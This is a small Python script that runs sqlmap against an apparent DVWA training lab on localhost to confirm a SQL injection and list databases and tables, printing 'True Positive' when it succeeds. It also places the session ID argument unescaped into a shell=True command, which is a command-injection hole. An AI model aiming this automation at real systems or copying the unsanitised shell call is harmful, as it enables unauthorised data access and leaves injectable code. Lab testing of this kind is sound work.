import subprocess
import sys

def run_sqlmap(session_id):
    # Define the command with the user-specified session ID
    command = f'sqlmap -u "http://localhost:8000/vulnerabilities/sqli/?id=1&Submit=Submit" --dbs --batch --cookie="PHPSESSID={session_id}; security=low" --tables'
    
    # Execute the command and save the output to a file
    with open("output_sqli.txt", "w") as output_file:
        process = subprocess.run(command, shell=True, stdout=output_file, stderr=subprocess.PIPE, text=True)
    
    # Read the output file to check for the keyword
    with open("output_sqli.txt", "r") as output_file:
        content = output_file.read()
    
    # Check if the output contains the keyword
    if "available databases" in content:
        print("✅ True Positive: SQL Injection Successful!")
    else:
        print("🚫 False Positive: SQL Injection Failed.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <session_id>")
        sys.exit(1)
    
    session_id = sys.argv[1]
    run_sqlmap(session_id)
